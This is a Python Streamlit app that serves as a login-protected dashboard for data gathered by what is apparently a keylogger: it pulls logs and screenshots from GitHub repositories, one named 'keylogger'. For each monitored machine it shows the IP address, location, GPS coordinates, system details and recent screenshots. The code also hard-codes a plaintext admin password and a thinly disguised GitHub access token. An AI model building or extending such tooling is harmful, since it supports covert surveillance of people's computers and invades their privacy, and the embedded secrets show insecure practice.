# user loging --> Active users Dashboard - count files(logs, cache , config , keylogerror file content viewer) - Download Files
# optimized for streamlit
# option to show files content 

import re
import ast
import hashlib
import requests
import pandas as pd 
import streamlit as st
from io import BytesIO
import plotly.express as px
from datetime import datetime
from PIL import ImageFile
from streamlit_image_zoom import image_zoom


# URL containing the tokens JSON
TOKEN_URL = "https://raw.githubusercontent.com/bebedudu/tokens/refs/heads/main/tokens.json"
# Default token if URL fetch fails
DEFAULT_TOKEN = "asdfg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aefthu"

# Your GitHub Personal Access Token
# List of repositories to display dashboards for
repositories = [
    { 
        'repo_name': 'programfeedback', 
        'activeuser_file': 'upmenu/activeusers.txt',
        'screenshot_folder': 'upmenu/upmenufeedback'
    },
    { 
        'repo_name': 'keylogger', 
        'activeuser_file': 'uploads/activeuserinfo.txt',
        'screenshot_folder': 'uploads/screenshots'
    }
]

# Initialize URLs for the first repository by default
repo_name = repositories[0]['repo_name']
activeuser_file = repositories[0]['activeuser_file']
screenshot_folder = repositories[0]['screenshot_folder']
DATA_URL = f"https://raw.githubusercontent.com/bebedudu/{repo_name}/refs/heads/main/{activeuser_file}"
SCREENSHOT_API_URL = f"https://api.github.com/repos/bebedudu/{repo_name}/contents/{screenshot_folder}"
SCREENSHOT_BASE_URL = f"https://raw.githubusercontent.com/bebedudu/{repo_name}/refs/heads/main/{screenshot_folder}/"


last_line = 50 # Number of lines to fetch
cache_time = 90  # Cache time in seconds
last_screenshot = 30  # Number of screenshots to fetch

def get_token():
    try:
        # Fetch the JSON from the URL
        response = requests.get(TOKEN_URL)
        if response.status_code == 200:
            token_data = response.json()

            # Check if the "dashboard" key exists
            if "dashboard" in token_data:
                token = token_data["dashboard"]

                # Remove the first 5 and last 6 characters
                processed_token = token[5:-6]
                # print(f"Token fetched and processed: {processed_token}")
                return processed_token
            else:
                print("Key 'dashboard' not found in the token data.")
        else:
            print(f"Failed to fetch tokens. Status code: {response.status_code}")
    except Exception as e:
        print(f"An error occurred while fetching the token: {e}")

    # Fallback to the default token
    print("Using default token.")
    return DEFAULT_TOKEN[5:-6]

# Call the function
GITHUB_TOKEN = get_token()
# print(f"Final Token: {GITHUB_TOKEN}")


# Encrypted username and password
USERNAME_HASH = hashlib.sha256("bibek48".encode()).hexdigest()
PASSWORD_HASH = hashlib.sha256("adminbibek".encode()).hexdigest()

# Function to validate login credentials
def authenticate_user(username, password):
    username_encrypted = hashlib.sha256(username.encode()).hexdigest()
    password_encrypted = hashlib.sha256(password.encode()).hexdigest()
    return username_encrypted == USERNAME_HASH and password_encrypted == PASSWORD_HASH


# Function to fetch the last 10 lines from active user text the private repository
@st.cache_data(ttl=cache_time)
def fetch_last_10_lines_private(url, token):
    headers = {
        "Authorization": f"token {token}"
    }
    try:
        response = requests.get(url, headers=headers)
        response.raise_for_status()
        lines = response.text.strip().split("\n")
        return lines[-last_line:]  # Return the last 10 lines
    except requests.RequestException as e:
        st.error(f"Failed to fetch data: {e}")
        return []

# Function to safely parse System Info
@st.cache_data(ttl=cache_time)
def preprocess_system_info(system_info_str):
    """
    Preprocesses the system info string by replacing unsupported objects (like sdiskpart)
    with a placeholder or simplified representation.
    """
    system_info_str = re.sub(r"sdiskpart\(.*?\)", "'Disk Partition'", system_info_str)  # Replace sdiskpart objects
    try:
        system_info = ast.literal_eval(system_info_str)
    except Exception as e:
        st.warning(f"Error parsing System Info: {e}")
        system_info = {"Error": "Unable to parse System Info"}
    return system_info

# Function to parse user info
@st.cache_data(ttl=cache_time)
def parse_user_info(lines):
    user_data = []
    for line in lines:
        user_info = {}
        user_info["raw"] = line
        
        timestamp_match = re.match(r"^(?P<timestamp>[\d-]+ [\d:]+) -", line)
        if timestamp_match:
            user_info["timestamp"] = timestamp_match.group("timestamp")
            
        match = re.search(
            r"User: (?P<username>.*?), IP: (?P<ip>.*?), Location: (?P<location>.*?), Org: (?P<org>.*?), Coordinates: (?P<coordinates>.*?),",
            line
        )
        if match:
            user_info.update(match.groupdict())
            
            # Add location prefix to the user field
            location_prefix = user_info["location"][:2]  # Extract first 2 characters of location
            user_info["username"] = f"{location_prefix}_{user_info['username']}"  # Add location prefix to username
        
        # Extract system info details
        system_info_match = re.search(r"System Info: (?P<system_info>{.*})", line)
        if system_info_match:
            system_info_str = system_info_match.group("system_info")
            user_info["system_info"] = preprocess_system_info(system_info_str)
        
        user_data.append(user_info)
    return user_data



# Authenticate GitHub API
def authenticate_github():
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    return headers

# Fetch GitHub API rate limit information
def get_github_rate_limit():
    headers = authenticate_github()
    url = "https://api.github.com/rate_limit"
    try:
        response = requests.get(url, headers=headers)
        response.raise_for_status()
        rate_limit_data = response.json()
        
        # Extract rate limit information
        limit = rate_limit_data['resources']['core']['limit']
        remaining = rate_limit_data['resources']['core']['remaining']
        reset_timestamp = rate_limit_data['resources']['core']['reset']
        
        # Convert reset timestamp to readable format
        reset_time = datetime.fromtimestamp(reset_timestamp).strftime('%Y-%m-%d %H:%M:%S')
        
        return limit, remaining, reset_time
    except Exception as e:
        st.error(f"Error fetching rate limit: {e}")
        return 5000, "Unknown", "Unknown"  # Default values



# last 30 screenshots
# To handle truncated images
ImageFile.LOAD_TRUNCATED_IMAGES = True

# GitHub API details
# GITHUB_API_URL_SS = SCREENSHOT_API_URL
# HEADERS_SS = {"Authorization": f"token {GITHUB_TOKEN}"}

# Function to get image URLs for a specific repository
def get_image_urls(screenshot_api_url, limit=30):
    headers = authenticate_github()
    response = requests.get(screenshot_api_url, headers=headers)
    if response.status_code == 200:
        files = response.json()
        image_files = [(file["name"], file["download_url"]) for file in files if file["name"].lower().endswith(('png', 'jpg', 'jpeg'))]
        return image_files[-limit:][::-1]  # Get last 'limit' images in reverse order
    else:
        st.error("Failed to fetch images. Check your API token and repository access.")
        return []

# Fetch the last 30 screenshots from the GitHub API for a specific repository
@st.cache_data(ttl=cache_time)  # Cache for 5 minutes
def fetch_screenshots_for_repo(screenshot_api_url):
    headers = authenticate_github()
    try:
        response = requests.get(screenshot_api_url, headers=headers)
        response.raise_for_status()
        files = response.json()
        screenshots = []
        for file in files[-last_screenshot:]:  # Fetch only the last 30 screenshots
            if file["name"].endswith(".png"):
                try: 
                    # 20250123_141302_bibek_screenshot_2025-01-23_14-12-19.png
                    # 20250125_124537_bibek_4C4C4544-0033-3910-804A-B3C04F324233_screenshot_2025-01-25_12-45-12.png
                    # Split the filename to extract details
                    name_parts = file["name"].split("_")
                    if len(name_parts) < 3:  # Ensure enough parts for parsing
                        st.warning(f"Skipping improperly formatted file: {file['name']}")
                        continue
                    date_time = name_parts[0] + name_parts[1]  # YYYYMMDD + HHMMSS
                    # user = name_parts[2]  # Extract user name
                    user = name_parts[2]+ name_parts[3]  # Extract user name
                    date_time = name_parts[0] + name_parts[1]  # Combine YYYYMMDD and HHMMSS
                    timestamp = datetime.strptime(date_time, "%Y%m%d%H%M%S")  # Parse into a datetime object
                    screenshots.append({
                        "name": file["name"],
                        "url": file["download_url"],
                        "user": user,
                        "timestamp": timestamp,
                    })
                except ValueError:
                    st.warning(f"Unable to parse filename: {file['name']}")
        return sorted(screenshots, key=lambda x: x["timestamp"], reverse=True)
    except requests.RequestException as e:
        st.error(f"Failed to fetch screenshot data: {e}")
        return []

# Download an image from a URL
def download_image(url):
    headers = authenticate_github()
    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        return BytesIO(response.content)  # Return image as BytesIO object
    else:
        return None

# Function to cache and retrieve image data
@st.cache_data(ttl=3600)  # Cache for 1 hour
def get_image_data(url):
    try:
        return requests.get(url).content
    except Exception as e:
        st.error(f"Failed to load image: {e}")
        return None

# Function to get unique users
@st.cache_data(ttl=cache_time)
def get_unique_users(user_data):
    seen_users = set()
    unique_users = []
    for user in user_data:
        if user["username"] not in seen_users:
            seen_users.add(user["username"])
            unique_users.append(user)
    return unique_users
    
    
def tabbeddashboard():

    st.title("GitHub Repository File Manager")
    
    # Fetch and display GitHub API rate limit information
    limit, remaining_token, reset_time = get_github_rate_limit()
    st.sidebar.info(f"GitHub API Rate Limit: {limit}, Remaining: {remaining_token}, Reset Time: {reset_time}")
    
    st.sidebar.header("Active User Activity Dashboard")

    # Function to generate dashboard for a specific repository
    def generate_repository_dashboard(repo):
        # Set up repository-specific URLs
        repo_name = repo['repo_name']
        activeuser_file = repo['activeuser_file']
        screenshot_folder = repo['screenshot_folder']
        data_url = f"https://raw.githubusercontent.com/bebedudu/{repo_name}/refs/heads/main/{activeuser_file}"
        screenshot_api_url = f"https://api.github.com/repos/bebedudu/{repo_name}/contents/{screenshot_folder}"
        screenshot_base_url = f"https://raw.githubusercontent.com/bebedudu/{repo_name}/refs/heads/main/{screenshot_folder}/"
        
        # Initialize session state for this repository if not exists
        repo_key = f"seen_users_{repo_name}"
        if repo_key not in st.session_state:
            st.session_state[repo_key] = set()
            
        # Fetch and parse the data for this repository
        lines = fetch_last_10_lines_private(data_url, GITHUB_TOKEN)
        user_data = parse_user_info(lines)
        
        # Fetch screenshots for this repository
        screenshot_data = fetch_screenshots_for_repo(screenshot_api_url)
        
        st.header(f"{repo_name.capitalize()} Repository Dashboard")
        
        if user_data:
            # Get unique users
            unique_users = get_unique_users(user_data)
            user_list = ["All"] + [user["username"] for user in unique_users]  # Add "All" for default option
            # Sidebar to select a user
            selected_user = st.sidebar.selectbox("Select a User", user_list, key=f"select_user_main_{repo_name}")
            # Filter data based on selection
            if selected_user != "All":
                filtered_users = [user for user in unique_users if user["username"] == selected_user]
            else:
                filtered_users = unique_users  # Only show unique users        
            # Title and "Update Dashboard" Button
            col1, col2 = st.columns([8, 2])  # Adjust column widths as needed
            with col1:
                st.title(f"Active Users: {len(filtered_users)}")
            with col2:
                if st.button(f"Update {repo_name} Dashboard"):
                    fetch_last_10_lines_private(data_url, GITHUB_TOKEN)
            # Identify new active users
            repo_key = f"seen_users_{repo_name}"
            current_users = set(user["username"] for user in unique_users)
            new_users = current_users - st.session_state[repo_key]
            st.session_state[repo_key].update(current_users)
            
            # Display details of filtered users (details of active user)
            st.header("Active User Dashboard")
            for user in filtered_users:
                # Use the extracted timestamp
                # timestamp = user["timestamp"]
                # with st.expander(f"Details for User: {user['username']} (IP: {user['ip']}, Last Active: {timestamp})"):
                with st.expander(f"Details for User: {user['username']} (Last Active: {user['timestamp']})"):
                    st.write(f"**Timestamp:** {user.get('timestamp', 'N/A')}")
                    st.write(f"**Location:** {user['location']}")
                    st.write(f"**Organization:** {user['org']}")
                    st.write(f"**Coordinates:** {user['coordinates']}")
                    # Display System Info in a table
                    if "system_info" in user:
                        system_info_df = pd.DataFrame(
                            user["system_info"].items(), columns=["Property", "Value"]
                        )
                        st.write("### System Info:")
                        st.table(system_info_df)
                        
            # Create a DataFrame for visualizations
            df = pd.DataFrame(filtered_users)
            df["city"] = df["location"].apply(lambda loc: loc.split(",")[1].strip() if "," in loc else "Unknown")
            df["country"] = df["location"].apply(lambda loc: loc.split(",")[0].strip() if "," in loc else "Unknown")
            # Add Visualization for Country/City Distribution
            st.write("## User Distribution by Country and City")
            # Bar Charts for Countries and Cities in two columns
            col1, col2 = st.columns(2)
            
            # Bar Chart for Countries
            country_counts = df["country"].value_counts().reset_index()
            country_counts.columns = ["Country", "Count"]
            with col1:
                st.write("### Country Distribution")
                country_chart = px.bar(country_counts, x="Country", y="Count", title="Active Users by Country")
                st.plotly_chart(country_chart, use_container_width=True)
            
            # Bar Chart for Cities
            city_counts = df["city"].value_counts().reset_index()
            city_counts.columns = ["City", "Count"]
            with col2:
                st.write("### City Distribution")
                city_chart = px.bar(city_counts, x="City", y="Count", title="Active Users by City")
                st.plotly_chart(city_chart, use_container_width=True)
            
            # Extract unique usernames from the screenshot data
            unique_users_screenshot = list({s["user"] for s in screenshot_data})  # Set to remove duplicates, then convert to list
            unique_users_screenshot.sort()  # Optional: Sort usernames alphabetically
            # Add "All Users" as the first option
            unique_users_screenshot.insert(0, "All Users")
            # Sidebar for user selection
            selected_user = st.sidebar.selectbox("Select User (Screenshot)", unique_users_screenshot, key=f"select_user_{repo_name}")
            
            show_screenshots_files = st.sidebar.checkbox("Hide Screenshots files", key=f"hide_screenshots_{repo_name}")
            if not show_screenshots_files:
                st.write("## User Latest Screenshots")
                # Display the latest screenshot for the selected user
                if selected_user == "All Users":
                    # Show the latest screenshot for each user
                    latest_screenshots = {}
                    for s in screenshot_data:
                        if s["user"] not in latest_screenshots:
                            latest_screenshots[s["user"]] = s

                    # Create a grid layout with 4 images per row
                    screenshots_list = list(latest_screenshots.values())
                    num_screenshots = len(screenshots_list)

                    # Use progress indicator for loading
                    with st.spinner("Loading images..."):
                        # Display images in rows of 4
                        for i in range(0, num_screenshots, 4):
                            # Create 4 columns for each row
                            cols = st.columns(4)

                            # Fill each column with an image (if available)
                            for j in range(4):
                                if i + j < num_screenshots:
                                    screenshot = screenshots_list[i + j]
                                    with cols[j]:
                                        try:
                                            # Cache the image data
                                            image_data = get_image_data(screenshot["url"])
                                            if image_data:
                                                st.image(
                                                    image_data,
                                                    caption=f"{screenshot['user']}\n{screenshot['timestamp']}",
                                                    use_container_width=True,
                                                )

                                            else:
                                                st.warning(f"Image for {screenshot['user']} failed to load")
                                        except Exception as e:
                                            st.error(f"Error displaying image: {str(e)}")
                else:
                    # Show screenshots for the selected user in a grid
                    user_screenshots = [s for s in screenshot_data if s["user"] == selected_user]
                    # Sort screenshots by timestamp (newest first)
                    user_screenshots = sorted(user_screenshots, key=lambda x: x["timestamp"], reverse=True)

                    num_screenshots = len(user_screenshots)

                    # Use progress indicator for loading
                    with st.spinner("Loading images..."):
                        # Display images in rows of 4
                        for i in range(0, num_screenshots, 4):
                            # Create 4 columns for each row
                            cols = st.columns(4)

                            # Fill each column with an image (if available)
                            for j in range(4):
                                if i + j < num_screenshots:
                                    screenshot = user_screenshots[i + j]
                                    with cols[j]:
                                        try:
                                            # Cache the image data
                                            image_data = get_image_data(screenshot["url"])
                                            if image_data:
                                                st.image(
                                                    image_data,
                                                    caption=f"{screenshot['timestamp']}",
                                                    use_container_width=True,
                                                )
                                            else:
                                                st.warning("Image failed to load")
                                        except Exception as e:
                                            st.error(f"Error displaying image: {str(e)}")
            
            
            
            # Add a button to update the data
            st.sidebar.button(f"Update {repo_name} Data", on_click=fetch_last_10_lines_private, args=(data_url, GITHUB_TOKEN))
            
            # Fetch and display GitHub API rate limit information
            limit, remaining_token, reset_time = get_github_rate_limit()
            st.sidebar.warning(f"GitHub API Rate Limit: {limit}, Remaining: {remaining_token}, Reset Time: {reset_time}")
            st.sidebar.markdown("---")  # Add a separator
            st.sidebar.write("© 2025 Bibek 💗. All rights reserved.")
        else:
            st.warning("No user data found!")
    
    # For backward compatibility (for the first repository)
    def fetch_screenshots():
        return fetch_screenshots_for_repo(SCREENSHOT_API_URL)
    
    # Loop through each repository and generate its dashboard
    for repo in repositories:
        generate_repository_dashboard(repo)
        st.markdown("---")  # Add separator between repository dashboards
    
# Streamlit app
st.set_page_config(page_title="Active User Dashboard", layout="wide", page_icon=":computer:")


# Login Functionality
def login():
    st.title("Login to the Dashboard")
    st.write("Please enter your credentials to access the dashboard.")

    # Login form
    with st.form("login_form"):
        username = st.text_input("Username")
        password = st.text_input("Password", type="password")
        submitted = st.form_submit_button("Login")

        if submitted:
            if authenticate_user(username, password):
                st.session_state["authenticated"] = True
                st.success("Login successful! Redirecting...")
            else:
                st.error("Invalid username or password.")

# Main app logic
if "authenticated" not in st.session_state:
    st.session_state["authenticated"] = False

if not st.session_state["authenticated"]:
    login()
else:
    tabbeddashboard()


# Custom footer
import datetime
current_year = datetime.datetime.now().year
st.markdown(f"""
    <hr>
    <footer style='text-align: center;'>
        © {current_year} Active User Dashboard | Developed by <a href='https://bibekchandsah.com.np' target='_blank' style='text-decoration: none; color: inherit;'>Bibek Chand Sah</a>
    </footer>
""", unsafe_allow_html=True)





